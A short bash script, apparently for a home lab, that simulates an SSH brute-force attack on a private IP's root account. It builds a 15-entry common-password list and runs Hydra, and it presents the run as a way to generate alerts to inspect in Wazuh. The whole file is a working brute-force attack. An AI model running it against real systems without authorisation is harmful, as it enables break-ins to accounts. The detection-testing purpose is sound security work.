#!/bin/bash

# =====================================================================
# Script: attack_simulation.sh
# Description: Simulates an SSH Brute-force attack using Hydra
# =====================================================================

set -euo pipefail

TARGET_IP="192.168.117.131" # Change this to your Target IP
USERNAME="root"
WORDLIST="pass15.txt"

if ! command -v hydra >/dev/null 2>&1; then
    echo "[!] Hydra is required on Kali. Install it with: sudo apt install -y hydra" >&2
    exit 1
fi

echo "[+] Creating the 15-entry dictionary from the latest screenshot..."
printf '%s\n' 123456 password 12345678 qwerty 123456789 12345 1234 111111 \
    1234567 dragon 123123 baseball abc123 football monkey > "$WORDLIST"

echo "[+] Starting SSH Brute-force simulation against $TARGET_IP..."
echo "[+] Using wordlist: $WORDLIST"

# Match the final completed run: two concurrent tasks; ignore a restore file.
hydra -l "$USERNAME" -P "$WORDLIST" "ssh://$TARGET_IP" -t 2 -I

echo "[+] Simulation finished. Read Hydra's result and inspect the Wazuh alerts."
